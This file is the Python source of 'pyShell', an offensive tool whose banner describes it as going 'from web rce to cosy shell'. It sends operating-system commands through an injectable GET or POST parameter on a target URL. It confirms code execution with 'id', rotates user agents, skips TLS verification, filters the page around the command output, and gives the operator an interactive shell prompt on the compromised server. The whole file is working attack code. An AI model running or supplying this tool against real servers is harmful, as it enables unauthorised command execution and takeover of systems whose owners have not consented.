#!/usr/bin/python3
#                           __ 
#         _____ _       _ _|  |
# ___ _ _|   __| |_ ___| | |  |
#| . | | |__   |   | -_| | |__|
#|  _|_  |_____|_|_|___|_|_|__|
#|_| |___|                     
#
# From web rce to cosy shell!

import sys
import requests
import re
import argparse
import random
from config import user_agent, colors

Verbose = False

def log(mode, msg):
	global Verbose
	if Verbose:
		if mode == 'e': # Error
			sys.stdout.write("%s[%sx%s] " % (colors['rst'], colors['red'], colors['rst']))
		elif mode == 'w': # Warning
			sys.stdout.write("%s[%s!%s] " % (colors['rst'], colors['ble'], colors['rst']))
		elif mode == 'a': # Action
			sys.stdout.write("%s[%s+%s] " % (colors['rst'], colors['cyn'], colors['rst']))
		elif mode == 'i': # Info
			sys.stdout.write("%s[%s*%s] " % (colors['rst'], colors['grn'], colors['rst']))
		sys.stdout.write("%s\n" % msg)
		sys.stdout.flush()

class pyShell():
	mask=""

	def __init__(self, args):
		global Verbose

		self.url		= self.explode_url(args.url)
		self.param		= args.parameter
		self.method		= args.method
		self.silent		= args.silent
		self.prepend	= args.prepend
		self.append		= args.append
		Verbose			= args.verbose

		log("i", "Url\t: %s%s" % (colors["grn"], self.url["full"]))
		log("i", "Parameter\t: %s%s" % (colors["grn"], self.param))
		log("i", "Method\t: %s%s" % (colors["grn"], self.method))
		log("i", "Prepended\t: %s%s" % (colors["grn"], self.prepend))
		log("i", "Appended\t: %s%s" % (colors["grn"], self.append))

		log("i", "Checking RCE...")

		if self.check_rce():
			log("i", "Filtering out static content...")
			self.mask=self.get_diff()
			self.run()


	def doReq(self, _data):
		_data = self.prepend + str(_data) + self.append
		ua = random.choice(user_agent)
		h = {'User-Agent': ua}

		# Black magic happens here
		if self.method == 'GET':
			self.url['params'][self.param] = _data
			output=requests.get(self.url['atkrdy'], params=self.url['params'], verify=False, headers=h)

		elif self.method == 'POST':
			output = requests.post(self.url['atkrdy'], params=self.url['params'], data={self.param: _data}, verify=False, headers=h)

		return (str(output.text), output.status_code)


	def explode_url(self, url):
		# TODO: refactor this lame code
		url_array=dict()
		url_data=url.split("/")
		url_array['full'] = url
		url_array['base'] = url_data[0] + "//" + url_data[2]
		url_array['relpath'] = url[url.index(url_array['base']) + len(url_array['base']):]
		url_array['params']=dict()

		if '?' in url_array['relpath']:
			url_array['paramstring'] = url_array['relpath'].split('?')[1]
			url_array['relpath'] = url_array['relpath'].split('?')[0]

			if '&' in url_array['paramstring']:
				for item in url_array['paramstring'].split("&"):
					(key,val)=item.split("=")
					url_array['params'][key] = val
			else:
				(key,val)=url_array['paramstring'].split("=")
				url_array['params'][key]=val

		url_array['atkrdy'] = url_array['base'] + url_array['relpath']
		return url_array
		

	def check_rce(self):
		if self.silent and not (input("Checking RCE? (y/N) ").lower() == 'y'):
			ret=True
		else:
			# Need something a bit more stealthy
			r=self.doReq("id")[0]
			if r.find("uid=") != -1 and r.find("gid=") != -1:
				log("a", "RCE confirmed!")
				ret=True
			else:
				log("e", "No RCE found.")
				ret=False

		return ret

	def get_diff(self):
		if self.silent and not (input("Filtering output? (y/N) ").lower() == 'y'):
			bmask=amask=""
		else:
			try:
				tok=random_str(round((random.random()*10) + 6))

				r=self.doReq("echo %s" % tok)[0]
				(bmask, amask) = re.split(tok, r)
				log("a", "Output filtered!")

			except:
				log("w", "Unable to filter output... No output fitering then...")
				bmask=amask=""

		return (bmask, amask)
			

	def doCmd(self, cmd):
		(r,sc)=self.doReq(cmd)
		if not self.silent:
			output=str(r[r.index(self.mask[0]) + len(self.mask[0]):r.index(self.mask[1])])
		else:
			output = r # ¯\_ツ_/¯

		if output:
			if output[-1] == '\n':
				output=output[:-1]
		return (output, sc)

	def run(self):
		if self.silent and self.mask[0] == "" and not (input("Get fancy prompt? (send 1 request - whoami;host;pwd) (y/N) ").lower() == 'y'):
			user=hostname=cwd=""
		else:
			log("a", "Getting shell info...")
			try:
				(user,hostname,cwd)=self.doCmd("whoami;hostname;pwd")[0].split("\n")
				log ("i", "User \t: %s%s" % (colors['grn'], user))
				log ("i", "Host \t: %s%s" % (colors['grn'], hostname))
				log ("i", "CWD \t: %s%s" % (colors['grn'], cwd))

			except Exception as e:
				log("e", "Unable to get you a fancy shell :< ")
				log("e", e)
				user=hostname=cwd=""


		if user == 'root':
			log("a", "%s w00t w00t!%s Please enjoy your r00t shell>%s" % (colors['red'], colors['rst']))
			terminator="#"
		else:
			log("a", "Here is your shell sir>")
			terminator="$"
		while True:
			prompt=input("%s@%s: %s %s " % (user, hostname, cwd, terminator))
			(ret,sc)=self.doCmd(prompt)
			print(sc)
			print(ret)

def main():
	args=parse_params()
	pyShell(args)

def parse_params():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', help="URL vulnerable to RCE", required=True)
	parser.add_argument('-p', '--parameter', help="Parameter to inject commands", required=True)
	parser.add_argument('-m', '--method', help="HTTP Method to use (default: GET)", required=False, default="GET")
	parser.add_argument('-s', '--silent', help="Will not send HTTP requests automatically", required=False, action="store_true")
	parser.add_argument('-v', '--verbose', help="Verbose mode", required=False, action="store_true")
	parser.add_argument('-P', '--prepend', help="Prepend each commands with something", required=False, default="")
	parser.add_argument('-A', '--append', help="Append each commands with something", required=False, default="")

	return parser.parse_args()


def random_str(length):
	return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(length))

if __name__=='__main__':
	main()

